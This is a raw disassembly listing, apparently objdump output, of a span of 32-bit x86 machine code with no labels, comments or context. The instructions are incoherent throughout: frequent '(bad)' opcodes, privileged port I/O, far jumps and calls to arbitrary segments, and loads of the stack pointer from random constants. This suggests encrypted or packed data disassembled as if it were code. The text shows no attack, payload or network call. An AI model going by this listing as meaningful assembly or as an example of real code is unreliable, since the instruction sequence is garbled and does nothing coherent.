  419d64:	dec    ecx
  419d65:	push   ss
  419d66:	test   al,0xa3
  419d68:	test   ecx,ecx
  419d6a:	pushf  
  419d6b:	sbb    BYTE PTR [ecx+eiz*2-0x26],ah
  419d6f:	inc    ebp
  419d70:	cmp    al,0x8a
  419d72:	pop    esp
  419d73:	push   ebp
  419d74:	outs   dx,DWORD PTR ds:[esi]
  419d75:	cmp    esi,esp
  419d77:	ss pop esi
  419d79:	pop    ecx
  419d7a:	loopne 0x419d2a
  419d7c:	sub    BYTE PTR [ecx],bl
  419d7e:	fsub   QWORD PTR [ecx]
  419d80:	cmp    al,0x5a
  419d82:	mov    ebp,DWORD PTR [edx-0x43]
  419d85:	mov    edi,eax
  419d87:	jae    0x419de2
  419d89:	outs   dx,BYTE PTR ds:[esi]
  419d8a:	scas   eax,DWORD PTR es:[edi]
  419d8b:	xor    eax,0x206e019d
  419d90:	je     0x419de0
  419d92:	lods   al,BYTE PTR ds:[si]
  419d94:	into   
  419d95:	(bad)  
  419d96:	cmc    
  419d97:	cmp    eax,0xfb389253
  419d9c:	aam    0xe4
  419d9e:	jecxz  0x419d6a
  419da0:	add    dh,BYTE PTR [eax]
  419da2:	into   
  419da3:	je     0x419d9d
  419da5:	outs   dx,BYTE PTR ds:[esi]
  419da6:	shr    BYTE PTR [edi-0x73],0x6b
  419daa:	xor    dl,bl
  419dac:	fs aaa 
  419dae:	jmp    0xc0e4:0x3d4ecfe6
  419db5:	das    
  419db6:	xor    dl,BYTE PTR [eax+0x55]
  419db9:	xchg   BYTE PTR [esi+0x2f],ch
  419dbc:	ret    0xdbd5
  419dbf:	jae    0x419d54
  419dc1:	mov    ds:0xfbe8827d,al
  419dc6:	mov    bh,0x63
  419dc8:	inc    ecx
  419dc9:	cwde   
  419dca:	inc    edx
  419dcb:	in     eax,dx
  419dcc:	dec    eax
  419dcd:	mov    fs,WORD PTR [esp+eax*8+0x5b0a1a38]
  419dd4:	push   ebx
  419dd5:	sub    eax,0xd9193d82
  419dda:	ds iret 
  419ddc:	add    eax,0x4867621e
  419de1:	pop    ds
  419de2:	dec    esi
  419de3:	sbb    DWORD PTR [eax-0x6b],eax
  419de6:	mov    al,ds:0x4d03dcd4
  419deb:	xchg   esp,eax
  419dec:	inc    edi
  419ded:	test   al,0xc0
  419def:	lds    edi,FWORD PTR [ecx]
  419df1:	dec    ebp
  419df2:	xchg   edx,edi
  419df4:	mov    dl,0xb7
  419df6:	call   0x4cc8ffbb
  419dfb:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dfd:	inc    ebp
  419dfe:	data16 mov cl,0xb0
  419e01:	fs mov esp,0x133a9
  419e07:	mov    al,0xa5
  419e09:	xor    eax,0x743ad4e6
  419e0e:	ds icebp 
  419e10:	cli    
  419e11:	dec    ecx
  419e12:	icebp  
  419e13:	imul   edx,DWORD PTR [ecx+0x2ac5cc74],0x74570464
  419e1d:	mov    ch,0x0
  419e1f:	xor    ah,BYTE PTR [ebx-0x10]
  419e22:	mov    ds:0x5a122563,eax
  419e27:	sahf   
  419e28:	in     al,0x8a
  419e2a:	jbe    0x419df6
  419e2c:	add    eax,0x13723373
  419e31:	outs   dx,DWORD PTR ds:[esi]
  419e32:	int    0x9f
  419e34:	sub    BYTE PTR [ebp+ecx*8+0x2a437009],dh
  419e3b:	sbb    BYTE PTR [edx-0x570cd182],cl
  419e41:	retf   
  419e42:	test   BYTE PTR [edx],al
  419e44:	mov    eax,0x267b5b10
  419e49:	cmp    eax,ebp
  419e4b:	mov    edx,0xd18e582b
  419e50:	call   0xa562a993
  419e55:	test   al,0xf6
  419e57:	icebp  
  419e58:	add    al,0x77
  419e5a:	adc    esp,edi
  419e5c:	cmp    BYTE PTR [edi],cl
  419e5e:	fs push ss
  419e60:	out    dx,al
  419e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e62:	mov    edi,0x13e0abc
  419e67:	inc    ebx
  419e68:	dec    ecx
  419e69:	mov    esp,0x7ccb2558
  419e6e:	ficom  WORD PTR [edi-0xc31999a]
  419e74:	jmp    0x2f6d:0xcf5ae70e
  419e7b:	pop    edx
  419e7c:	iret   
  419e7d:	fs div ch
  419e80:	mov    ecx,0x63d6f7e7
  419e85:	adc    DWORD PTR [eax+0x36],edx
  419e88:	cs dec edi
  419e8a:	int    0x4c
  419e8c:	mov    ds,WORD PTR [ebx+0x12]
  419e8f:	or     al,0x34
  419e91:	xor    eax,0xcd1720
  419e96:	pop    esp
  419e97:	lods   eax,DWORD PTR ds:[esi]
  419e98:	iret   
  419e99:	fnsave [esi+ebx*4-0xda69297]
  419ea0:	push   esi
  419ea1:	sub    ah,al
  419ea3:	ins    BYTE PTR es:[edi],dx
  419ea4:	das    
  419ea5:	pop    eax
  419ea6:	xchg   esp,eax
  419ea7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ea8:	push   ds
  419ea9:	xchg   al,dl
  419eab:	and    eax,0x4a250eb
  419eb0:	mov    WORD PTR [ebx-0x2],ss
  419eb3:	push   eax
  419eb4:	jb     0x419e53
  419eb6:	(bad)  
  419eb7:	popa   
  419eb8:	je     0x419ee6
  419eba:	call   0xe205c8ec
  419ebf:	jg     0x419ef6
  419ec1:	add    eax,0xc04ee0a8
  419ec6:	out    0x57,al
  419ec8:	xchg   edx,eax
  419ec9:	or     edi,ebx
  419ecb:	rcr    esi,0x8
  419ece:	div    BYTE PTR [edx+0x0]
  419ed1:	popa   
  419ed2:	fwait
  419ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ed4:	ss inc edi
  419ed6:	dec    edi
  419ed7:	fbstp  TBYTE PTR [ebp+0x32da4c69]
  419edd:	mov    eax,ds:0x73e984ef
  419ee2:	lahf   
  419ee3:	jb     0x419f53
  419ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ee6:	jb     0x419f5b
  419ee8:	out    0x9a,eax
  419eea:	mov    esp,0xdc9615c6
  419eef:	pop    eax
  419ef0:	daa    
  419ef1:	lahf   
  419ef2:	ret    
  419ef3:	into   
  419ef4:	sub    al,0x8d
  419ef6:	fcomp  DWORD PTR [edi]
  419ef8:	inc    eax
  419ef9:	leave  
  419efa:	dec    esi
  419efb:	sahf   
  419efc:	lock jo 0x419e89
  419eff:	dec    edx
  419f00:	jno    0x419f6e
  419f02:	mov    ds:0x25ad341e,al
  419f07:	rol    DWORD PTR [edi],0x89
  419f0a:	xchg   ecx,eax
  419f0b:	mov    edx,0x796db668
  419f10:	inc    esi
  419f11:	xor    DWORD PTR [eax+0x687ba8b5],ebp
  419f17:	(bad)  
  419f19:	pop    edi
  419f1a:	mov    bh,0xb3
  419f1c:	xor    edx,ebp
  419f1e:	jg     0x419f01
  419f20:	or     DWORD PTR [ebp+0x582e939],esp
  419f26:	mov    bh,0x4c
  419f28:	sub    esi,DWORD PTR [eax]
  419f2a:	jb     0x419f26
  419f2c:	aam    0x96
  419f2e:	pop    eax
  419f2f:	sub    dh,BYTE PTR [esi]
  419f31:	mov    edi,esi
  419f33:	sar    DWORD PTR [eax+edx*1],0x23
  419f37:	sbb    cl,cl
  419f39:	out    dx,al
  419f3a:	pop    es
  419f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f3c:	pusha  
  419f3d:	cs jbe 0x419f0a
  419f40:	sub    eax,0x7225cd56
  419f45:	jmp    0xe407a325
  419f4a:	shl    DWORD PTR [edi],0x9c
  419f4d:	push   es
  419f4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f4f:	mov    BYTE PTR [ebp+0x3bb776f5],dl
  419f55:	mov    eax,0xf57c4b01
  419f5a:	out    dx,al
  419f5b:	xor    cl,bl
  419f5d:	dec    edi
  419f5e:	repz jg 0x419ef8
  419f61:	adc    edx,DWORD PTR [edi+0x46]
  419f64:	inc    ebx
  419f65:	fisttp DWORD PTR [eax+0x75]
  419f68:	mov    DWORD PTR ds:[ebx+0xb],0x793ee873
  419f70:	push   cs
  419f71:	xchg   esp,eax
  419f72:	cmp    ebx,DWORD PTR ds:0x5cc36e5c
  419f78:	adc    eax,0x284d25d6
  419f7d:	jnp    0x419f71
  419f7f:	pop    ds
  419f80:	arpl   WORD PTR [edx-0x3c],sp
  419f83:	js     0x419f5a
  419f85:	xor    dh,bh
  419f87:	movaps xmm7,XMMWORD PTR [ebx]
  419f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f8b:	sub    al,0x15
  419f8d:	add    DWORD PTR [eax-0x4d729e02],0xffffffec
  419f94:	pop    ds
  419f95:	ins    BYTE PTR es:[edi],dx
  419f96:	pop    ds
  419f97:	pop    edi
  419f98:	aad    0x92
  419f9a:	(bad)  
  419f9b:	jae    0x419fc7
  419f9d:	mov    ds:0x8ce07467,al
  419fa2:	and    ecx,edx
  419fa4:	pop    ds
  419fa5:	cli    
  419fa6:	pop    esp
  419fa7:	stc    
  419fa8:	popf   
  419fa9:	xor    DWORD PTR [ebx+0x68],edx
  419fac:	dec    edi
  419fad:	int    0x93
  419faf:	xchg   ebp,eax
  419fb0:	les    edi,FWORD PTR [ebx-0x70e78ada]
  419fb6:	into   
  419fb7:	mov    ecx,DWORD PTR [ebx+0x5e50224a]
  419fbd:	mov    ds:0x5d5651a2,eax
  419fc2:	aaa    
  419fc3:	fadd   DWORD PTR [eax-0x775f55c6]
  419fc9:	clc    
  419fca:	cmp    ah,BYTE PTR [ecx-0x4f7dea8c]
  419fd0:	in     al,0x0
  419fd2:	mov    esp,0x32e7283d
  419fd7:	jp     0x41a016
  419fd9:	loope  0x41a011
  419fdb:	in     al,dx
  419fdc:	and    WORD PTR [edi+eax*1-0x20],bx
  419fe1:	sti    
  419fe2:	test   BYTE PTR [ecx+0x56],bl
  419fe5:	ins    BYTE PTR es:[edi],dx
  419fe6:	sub    eax,0x539ce1e3
  419feb:	fisubr WORD PTR [edi]
  419fed:	sbb    BYTE PTR [esi],cl
  419fef:	xor    edi,edx
  419ff1:	jecxz  0x419faa
  419ff3:	jecxz  0x41a061
  419ff5:	fidiv  DWORD PTR ds:0x482c2191
  419ffb:	xchg   edi,eax
  419ffc:	mov    bh,0x2c
  419ffe:	loopne 0x419fb2
  41a000:	xor    BYTE PTR [esi-0x3db8fae1],0x1c
  41a007:	pop    eax
  41a008:	pop    esi
  41a009:	push   0x2f69e251
  41a00e:	mov    esp,0xf501064d
  41a013:	outs   dx,BYTE PTR ds:[esi]
  41a014:	push   es
  41a015:	in     eax,0x88
  41a017:	adc    al,0x54
  41a019:	jmp    0x44f7:0x4e88a8f7
  41a020:	push   edi
  41a021:	sub    dl,BYTE PTR [esi+0x70]
  41a024:	das    
  41a025:	push   ebx
  41a026:	jno    0x41a015
  41a028:	mov    ch,ah
  41a02a:	and    DWORD PTR [esi],edx
  41a02c:	xlat   BYTE PTR ds:[ebx]
  41a02d:	mov    esi,0xd0e6cd04
  41a032:	fiadd  DWORD PTR [ebx-0x1a4a12e5]
  41a038:	sub    dh,BYTE PTR [eax+0x1a]
  41a03b:	jl     0x41a06a
  41a03d:	rcr    DWORD PTR [edx-0x2],0xe9
  41a041:	adc    DWORD PTR [edx+0x5ac5600f],edx
  41a047:	out    0x7e,al
  41a049:	mov    eax,ds:0x679080ef
  41a04e:	mov    edx,0x6cd817b4
  41a053:	sti    
  41a054:	inc    eax
  41a055:	loope  0x41a062
  41a057:	jne    0x41a008
  41a059:	push   ebp
  41a05a:	hlt    
  41a05b:	rcr    DWORD PTR [ebp-0x69bdac45],0xa
  41a062:	rol    DWORD PTR [ebx+esi*8+0x493792f2],0x20
  41a06a:	std    
  41a06b:	xchg   BYTE PTR [eax],bl
  41a06d:	mov    dl,0x90
  41a06f:	xchg   ebx,eax
  41a070:	and    eax,0x44b2c748
  41a075:	cmp    al,0x82
  41a077:	cmp    BYTE PTR [edx],dh
  41a079:	inc    ebx
  41a07a:	or     BYTE PTR [esi+0x780ade16],dh
  41a080:	mov    edi,0x2103ee9d
  41a085:	cmp    edi,DWORD PTR [eax+0x48b08008]
  41a08b:	test   al,0xc6
  41a08d:	or     cl,al
  41a08f:	mov    ecx,0x8f672907
  41a094:	sub    DWORD PTR [esp+edi*1+0x4635e0ce],ebx
  41a09b:	out    dx,al
  41a09c:	sbb    eax,0x4f2b003e
  41a0a1:	popa   
  41a0a2:	inc    ebp
  41a0a3:	sub    BYTE PTR [ebx],0xcb
  41a0a6:	lods   al,BYTE PTR ds:[esi]
  41a0a7:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41a0a9:	data16 std 
  41a0ab:	inc    edx
  41a0ac:	mov    ds:0xe1b23e57,eax
  41a0b1:	bound  esi,QWORD PTR ds:[esi-0x1c]
  41a0b5:	jo     0x41a055
  41a0b7:	jge    0x41a05c
  41a0b9:	cmp    ch,dh
  41a0bb:	adc    DWORD PTR [ebx-0x26b48862],0x2c94271d
  41a0c5:	cwde   
  41a0c6:	iret   
  41a0c7:	out    0x36,al
  41a0c9:	(bad)  
  41a0ca:	int3   
  41a0cb:	push   edx
  41a0cc:	mov    DWORD PTR [edi],eax
  41a0ce:	fwait
  41a0cf:	mov    BYTE PTR [ecx-0x55],dh
  41a0d2:	dec    ebp
  41a0d3:	aam    0x66
  41a0d5:	in     al,dx
  41a0d6:	mov    ecx,0x11da471
  41a0db:	dec    eax
  41a0dc:	inc    edi
  41a0dd:	cmc    
  41a0de:	jb     0x41a150
  41a0e0:	out    dx,al
  41a0e1:	fild   QWORD PTR [ecx]
  41a0e3:	(bad)  [ecx+0x6f]
  41a0e6:	lods   eax,DWORD PTR ds:[esi]
  41a0e7:	call   0x2140:0x5ceb40dd
  41a0ee:	and    BYTE PTR [edx+0x5b],cl
  41a0f1:	imul   eax,edx,0x393bd413
  41a0f7:	sub    DWORD PTR [edi],edi
  41a0f9:	test   eax,0xcd1ee8d1
  41a0fe:	sub    BYTE PTR [ecx],cl
  41a100:	mov    eax,ds:0x6e9434bc
  41a105:	repz mov cl,0x87
  41a108:	aas    
  41a109:	aam    0xf1
  41a10b:	sbb    BYTE PTR [ebx-0x2ab43840],bh
  41a111:	sbb    ecx,DWORD PTR [eax+0x176ae8d5]
  41a117:	das    
  41a118:	shl    DWORD PTR [eax+0x1acc72b1],cl
  41a11e:	fsubr  DWORD PTR [eax-0x3e]
  41a121:	adc    ebx,eax
  41a123:	jno    0x41a129
  41a125:	mov    ebx,0x27578c39
  41a12a:	sbb    eax,0x60f801f0
  41a12f:	pop    esi
  41a130:	mov    ch,0xee
  41a132:	mov    bh,0x51
  41a134:	push   edi
  41a135:	dec    ebx
  41a136:	pop    ds
  41a137:	push   edi
  41a138:	and    edi,0xa17b26a8
  41a13e:	les    ebx,FWORD PTR [esi-0x1c8d9ffc]
  41a144:	mov    al,ds:0xa35d5595
  41a149:	(bad)  [ecx]
  41a14b:	xor    cl,al
  41a14d:	xchg   BYTE PTR [esi+0x672d051c],dh
  41a153:	clc    
  41a154:	inc    esi
  41a155:	in     al,dx
  41a156:	cmp    DWORD PTR [ecx-0x34a816bd],ebp
  41a15c:	sbb    al,0xc4
  41a15e:	jmp    0xf081:0xb8146061
  41a165:	sbb    dl,dh
  41a167:	dec    esi
  41a168:	lahf   
  41a169:	mov    esp,0x1b8360fb
  41a16e:	jnp    0x41a146
  41a170:	push   0x35e9212b
  41a175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a176:	out    dx,al
  41a177:	retf   0x6536
  41a17a:	out    dx,al
  41a17b:	repz xchg esi,eax
  41a17d:	shr    DWORD PTR [ebx],0x22
  41a180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a181:	cmp    eax,DWORD PTR [eax+0x5a83467a]
  41a187:	in     eax,dx
  41a188:	sub    dh,ah
  41a18a:	dec    esp
  41a18b:	mov    ah,0xe5
  41a18d:	mov    al,ds:0xe7de5900
  41a192:	jno    0x41a133
  41a194:	(bad)  
  41a196:	sub    DWORD PTR [esi-0x23a63547],ecx
  41a19c:	xchg   ecx,eax
  41a19d:	sub    DWORD PTR [ebx-0x1f],0x7c
  41a1a1:	cmp    eax,0x168154f4
  41a1a6:	mov    ds:0xb9341512,al
  41a1ab:	and    eax,0x19eeedf
  41a1b0:	out    dx,al
  41a1b1:	inc    ebp
  41a1b2:	loop   0x41a174
  41a1b4:	popf   
  41a1b5:	bound  edi,QWORD PTR [edi+0xd1acbbb]
  41a1bb:	jno    0x41a1a3
  41a1bd:	or     DWORD PTR [edi],esi
  41a1bf:	push   ecx
  41a1c0:	aas    
  41a1c1:	scas   eax,DWORD PTR es:[edi]
  41a1c2:	daa    
  41a1c3:	test   al,0x8a
  41a1c5:	cs je  0x41a16b
  41a1c8:	retf   0x979b
  41a1cb:	and    ebx,ebp
  41a1cd:	adc    BYTE PTR [ebx-0x153c05d0],dl
  41a1d3:	icebp  
  41a1d4:	mov    al,0x4
  41a1d6:	push   ds
  41a1d7:	mov    ebp,DWORD PTR [ecx-0x359d1600]
  41a1dd:	pop    ss
  41a1de:	sbb    bh,BYTE PTR [eax+0x33]
  41a1e1:	mov    ebp,0xcebe8682
  41a1e6:	mov    esi,0x8d6af28a
  41a1eb:	bound  ebx,QWORD PTR [edi]
  41a1ed:	mov    BYTE PTR ds:0x32f145f8,bh
  41a1f3:	add    ecx,DWORD PTR [ebx]
  41a1f5:	out    dx,al
  41a1f6:	hlt    
  41a1f7:	dec    esp
  41a1f8:	sbb    al,0x5f
  41a1fa:	xchg   BYTE PTR [edx-0x5f7fd61d],ah
  41a200:	retf   
  41a201:	add    DWORD PTR [eax+0x39],eax
  41a204:	retf   
  41a205:	or     DWORD PTR [eax],edx
  41a207:	sbb    ah,BYTE PTR [edi-0x6c238923]
  41a20d:	ret    0x481d
  41a210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a211:	rcr    edx,1
  41a213:	push   edi
  41a214:	cmc    
  41a215:	add    eax,0xbbf92061
  41a21a:	je     0x41a1b0
  41a21c:	inc    ebx
  41a21d:	sbb    dh,dl
  41a21f:	add    DWORD PTR [ecx+0x620711e7],edi
  41a225:	mov    cl,0xf5
  41a227:	xchg   BYTE PTR [ecx-0x4daf3058],ah
  41a22d:	aaa    
  41a22e:	loopne 0x41a252
  41a230:	dec    esp
  41a231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a232:	outs   dx,DWORD PTR cs:[esi]
  41a234:	xor    eax,0x9b1bc1e8
  41a239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a23a:	fwait
  41a23b:	pop    esp
  41a23c:	push   eax
  41a23d:	cwde   
  41a23e:	dec    edx
  41a23f:	jg     0x41a248
  41a241:	xchg   edi,eax
  41a242:	stos   BYTE PTR es:[edi],al
  41a243:	das    
  41a244:	jnp    0x41a2b2
  41a246:	ins    DWORD PTR es:[edi],dx
  41a247:	adc    BYTE PTR [edx+0x38],cl
  41a24a:	into   
  41a24b:	in     al,dx
  41a24c:	jg     0x41a2b1
  41a24e:	inc    esi
  41a24f:	xchg   ecx,eax
  41a250:	push   edi
  41a251:	jb     0x41a1f9
  41a253:	js     0x41a22d
  41a255:	neg    DWORD PTR [ecx-0x4c3df3bb]
  41a25b:	sbb    bl,BYTE PTR [ebp-0x15]
  41a25e:	loop   0x41a244
  41a260:	sub    DWORD PTR ss:[ecx-0x6a14faea],ecx
  41a267:	xor    al,0x59
  41a269:	(bad)  
  41a26b:	inc    edi
  41a26c:	dec    eax
  41a26d:	aad    0xa6
  41a26f:	adc    eax,0x872a3cf8
  41a274:	add    DWORD PTR [esi],ebx
  41a276:	cwde   
  41a277:	jge    0x41a28c
  41a279:	mov    ds:0x1c6defa3,eax
  41a27e:	test   eax,0x9fac6f32
  41a283:	cmp    eax,0x9b9ef9bc
  41a288:	mov    al,BYTE PTR [edi+0x0]
  41a28b:	neg    DWORD PTR [ebx+0x1fc0d696]
  41a291:	xchg   ecx,eax
  41a292:	xor    eax,0xb1af8b84
  41a297:	and    DWORD PTR [ebx+0x61],0xd967d1dd
  41a29e:	out    dx,eax
  41a29f:	add    edx,ebx
  41a2a1:	mov    DWORD PTR [eax+0x38],eax
  41a2a4:	jp     0x41a22d
  41a2a6:	cld    
  41a2a7:	xor    al,0x2e
  41a2a9:	mov    cl,0x73
  41a2ab:	xchg   DWORD PTR [ecx],esi
  41a2ad:	mov    edi,0xf0e35ce4
  41a2b2:	les    esp,FWORD PTR [ebx]
  41a2b4:	shl    BYTE PTR [edx-0x6604ec0a],1
  41a2ba:	std    
  41a2bb:	jecxz  0x41a324
  41a2bd:	mov    DWORD PTR [edi],eax
  41a2bf:	xor    bl,ah
  41a2c1:	fst    DWORD PTR [edx-0x62f50764]
  41a2c7:	and    esp,0xffffffe7
  41a2ca:	imul   esi,ecx,0x15
  41a2cd:	cmp    DWORD PTR [edi-0x6be5c0f2],ebx
  41a2d3:	cmp    al,0x2c
  41a2d5:	add    DWORD PTR [eax+0x72ccf6da],ebp
  41a2db:	pop    edx
  41a2dc:	fld    st(0)
  41a2de:	jp     0x41a280
  41a2e0:	xor    al,0x34
  41a2e2:	mov    ebp,0x17ff1d60
  41a2e7:	or     bl,bh
  41a2e9:	das    
  41a2ea:	sub    al,BYTE PTR [ebx]
  41a2ec:	push   ebx
  41a2ed:	mov    al,ds:0x5ca87d26
  41a2f2:	cmp    eax,0xf85719ba
  41a2f7:	sbb    al,0x42
  41a2f9:	add    ebx,esi
  41a2fb:	jl     0x41a31b
  41a2fd:	(bad)  
  41a2fe:	pop    ss
  41a2ff:	push   ds
  41a300:	stos   DWORD PTR es:[edi],eax
  41a301:	mov    ds:0x5d488b32,eax
  41a306:	sbb    eax,0x6255e416
  41a30b:	lock adc eax,0x22b11c09
  41a311:	aas    
  41a312:	ficomp DWORD PTR [eax]
  41a314:	inc    ecx
  41a315:	lahf   
  41a316:	sbb    esp,esi
  41a318:	dec    BYTE PTR [ebp-0x80]
  41a31b:	sbb    ecx,DWORD PTR [ecx]
  41a31d:	pop    esp
  41a31e:	xor    BYTE PTR [eax-0x5f6dd99a],bl
  41a324:	std    
  41a325:	mov    cl,0x8a
  41a327:	dec    edx
  41a328:	iret   
  41a329:	imul   esi,DWORD PTR [ebx+0x78],0x514f4cf6
  41a330:	out    0x47,al
  41a332:	jmp    0x41a2dc
  41a334:	ds pop edx
  41a336:	sub    ch,BYTE PTR [edi-0x67bc826f]
  41a33c:	shl    esp,1
  41a33e:	mov    al,ds:0xa37f851a
  41a343:	inc    ebx
  41a344:	cmp    BYTE PTR [ebp-0x16],al
  41a347:	loope  0x41a305
  41a349:	cwde   
  41a34a:	xor    eax,0x94c4d93c
  41a34f:	enter  0x12ba,0x9c
  41a353:	or     eax,0x1f485c8c
  41a358:	ds enter 0xb470,0x8d
  41a35d:	out    0x35,al
  41a35f:	dec    eax
  41a360:	add    BYTE PTR [esi-0x4cf9dad2],bh
  41a366:	pop    ebp
  41a367:	pop    esp
  41a368:	cmp    bl,cl
  41a36a:	xchg   esi,eax
  41a36b:	stc    
  41a36c:	sbb    DWORD PTR [ecx-0x7f],ecx
  41a36f:	stos   BYTE PTR es:[edi],al
  41a370:	mov    ah,0xb8
  41a372:	add    WORD PTR [edi],bx
  41a375:	fldenv [edi]
  41a377:	jge    0x41a302
  41a379:	adc    DWORD PTR [esi-0x14],edx
  41a37c:	push   eax
  41a37d:	inc    ebp
  41a37e:	mov    dl,0x72
  41a380:	mov    ah,0xdb
  41a382:	xlat   BYTE PTR ds:[ebx]
  41a383:	sti    
  41a384:	leave  
  41a385:	jmp    0x7d0557d3
  41a38a:	mov    ecx,0x31bafd2f
  41a38f:	imul   BYTE PTR [edi]
  41a391:	sar    cl,0x3a
  41a394:	jne    0x41a33c
  41a396:	mov    ebx,0xe126438c
  41a39b:	(bad)  
  41a39c:	sub    eax,0xd0b9c4b9
  41a3a1:	mov    ch,0xaa
  41a3a3:	retf   0x1435
  41a3a6:	add    ebx,DWORD PTR ds:[ebp-0x16]
  41a3aa:	outs   dx,BYTE PTR ds:[esi]
  41a3ab:	cwde   
  41a3ac:	adc    al,0xc7
  41a3ae:	lahf   
  41a3af:	aad    0x35
  41a3b1:	dec    ebp
  41a3b2:	xchg   esp,eax
  41a3b3:	xchg   esi,eax
  41a3b4:	frstor [edx+0x51]
  41a3b7:	dec    ebp
  41a3b8:	adc    al,0x71
  41a3ba:	add    BYTE PTR [esi+0x88f0457],ah
  41a3c0:	sub    bl,BYTE PTR [edx]
  41a3c2:	push   ds
  41a3c3:	mov    esp,0xa771feba
  41a3c8:	and    BYTE PTR [edx+esi*2+0x32],ah
  41a3cc:	in     al,0xd0
  41a3ce:	stc    
  41a3cf:	inc    ecx
  41a3d0:	inc    edx
  41a3d1:	aaa    
  41a3d2:	mov    eax,0xa524d8d2
  41a3d7:	call   0x8c90:0x3f8f0ea7
  41a3de:	mov    bl,BYTE PTR [eax+0x48]
  41a3e1:	enter  0x9a38,0x1d
  41a3e5:	mov    eax,ds:0xf30d01ae
  41a3ea:	test   al,0x73
  41a3ec:	pop    es
  41a3ed:	mov    ebx,0x1af054c3
  41a3f2:	xor    eax,0xc06c87b4
  41a3f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3f8:	hlt    
  41a3f9:	aas    
  41a3fa:	lahf   
  41a3fb:	pop    edi
  41a3fc:	(bad)  
  41a3fe:	or     BYTE PTR [ebp+eax*8+0x50a406ab],bh
  41a405:	xchg   esp,eax
  41a406:	push   ecx
  41a407:	(bad)
  41a40a:	fldcw  WORD PTR [edx+edi*2-0x791a4647]
  41a411:	or     esp,esp
  41a413:	mov    ch,0xd6
  41a415:	sbb    edi,ebx
  41a417:	jmp    0x24923d10
  41a41c:	popf   
  41a41d:	jns    0x41a451
  41a41f:	mov    dl,BYTE PTR [eax]
  41a421:	cwde   
  41a422:	clc    
  41a423:	in     eax,dx
  41a424:	ins    DWORD PTR es:[edi],dx
  41a425:	and    dl,BYTE PTR [eax*4+0x399be07a]
  41a42c:	scas   eax,DWORD PTR es:[edi]
  41a42d:	push   cs
  41a42e:	jb     0x41a3d6
  41a430:	cwde   
  41a431:	ds and eax,eax
  41a434:	xchg   ecx,eax
  41a435:	jbe    0x41a3dc
  41a437:	cs push es
  41a439:	cmp    al,0xdb
  41a43b:	add    dl,BYTE PTR [edx+ebp*2+0x4f]
  41a43f:	fsub   QWORD PTR [esi-0x67]
  41a442:	sub    BYTE PTR [eax+0x3cf76d04],dl
  41a448:	pop    ebx
  41a449:	add    DWORD PTR [ecx+edx*2+0x77a5d7f],edx
  41a450:	mov    ecx,0x9df0a802
  41a455:	test   eax,0xd6bde4c7
  41a45a:	sti    
  41a45b:	ja     0x41a4d6
  41a45d:	shr    esi,1
  41a45f:	js     0x41a428
  41a461:	adc    dl,BYTE PTR [ebx+0x64]
  41a464:	or     BYTE PTR [ebx+esi*2-0x77],al
  41a468:	not    esp
  41a46a:	adc    eax,0x81298baa
  41a46f:	arpl   WORD PTR [esi-0x2a28e384],di
  41a475:	jb     0x41a462
  41a477:	lahf   
  41a478:	test   al,0x94
  41a47a:	test   eax,0x342b8158
  41a47f:	aaa    
  41a480:	ds into 
  41a482:	push   edx
  41a483:	inc    edx
  41a484:	in     al,dx
  41a485:	popf   
  41a486:	jb     0x41a463
  41a488:	mov    cl,0xd9
  41a48a:	addr16 out dx,eax
  41a48c:	and    ecx,0xffffffeb
  41a48f:	into   
  41a490:	push   edx
  41a491:	and    DWORD PTR [edi],ebx
  41a493:	and    al,0xe7
  41a495:	cmp    esi,DWORD PTR [esp+esi*2]
  41a498:	in     eax,dx
  41a499:	mov    edi,0x93479238
  41a49e:	xor    DWORD PTR [ebp+0x6711cffd],esp
  41a4a4:	xchg   ecx,eax
  41a4a5:	add    DWORD PTR [esi-0x41],edx
  41a4a8:	adc    BYTE PTR [eax+0x7d],dl
  41a4ab:	adc    edi,DWORD PTR [esi-0x1f0368]
  41a4b1:	sub    ebx,DWORD PTR [ebx+0x33]
  41a4b4:	ret    
  41a4b5:	das    
  41a4b6:	jae    0x41a512
  41a4b8:	or     al,0xc1
  41a4ba:	adc    eax,0x735902a8
  41a4bf:	pop    ebp
  41a4c0:	jno    0x41a496
  41a4c2:	cmp    eax,0x1036586a
  41a4c7:	mov    ah,0xce
  41a4c9:	(bad)  
  41a4ca:	dec    ebx
  41a4cb:	leave  
  41a4cc:	ds xchg esi,eax
  41a4ce:	loope  0x41a46b
  41a4d0:	jp     0x41a45a
  41a4d2:	addr16 inc eax
  41a4d4:	or     ecx,ebp
  41a4d6:	jmp    0xa6a98416
  41a4db:	push   ebx
  41a4dc:	or     al,0x15
  41a4de:	fcmovnu st,st(7)
  41a4e0:	cmc    
  41a4e1:	fist   WORD PTR [esi-0x34cd0495]
  41a4e7:	lds    edx,FWORD PTR [ecx-0x1edfcaaf]
  41a4ed:	push   ecx
  41a4ee:	add    ecx,DWORD PTR [ecx]
  41a4f0:	add    edx,eax
  41a4f2:	xor    DWORD PTR [esi],esi
  41a4f4:	add    edx,esi
  41a4f6:	test   DWORD PTR [eax],ebp
  41a4f8:	inc    ebx
  41a4f9:	push   edi
  41a4fa:	xor    eax,0x80728066
  41a4ff:	addr16 mov esi,0x8c851a82
  41a505:	test   DWORD PTR [edi],esp
  41a507:	fs loope 0x41a4bc
  41a50a:	call   0xc026:0x5734fbc0
  41a511:	and    BYTE PTR [ecx],dl
  41a513:	test   BYTE PTR [ebp+0x536920aa],ah
  41a519:	xor    ecx,DWORD PTR [ebx+0x22f71944]
  41a51f:	test   al,0x6c
  41a521:	pop    ebp
  41a522:	rol    BYTE PTR [ecx],1
  41a524:	sub    edi,DWORD PTR [ebx]
